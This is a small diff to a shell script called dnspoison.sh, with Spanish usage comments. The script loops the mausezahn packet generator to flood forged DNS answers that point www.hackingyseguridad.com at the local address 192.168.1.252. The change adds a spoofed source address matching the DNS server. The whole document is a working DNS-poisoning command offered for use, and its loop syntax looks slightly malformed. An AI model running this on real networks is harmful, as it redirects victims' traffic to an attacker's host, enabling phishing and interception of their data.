@@ -5,4 +5,4 @@
 # Ejecutar ./dnspoison.sh
 # Para parar Control + C
 
-while : ; do; mz eth0  -B 194.179.1.100 -t dns "q=www.hackingyseguridad.com, a=192.168.1.252" done;
+while : ; do; mz eth0  -A 194.179.1.100 -B 194.179.1.100 -t dns "q=www.hackingyseguridad.com, a=192.168.1.252" done;
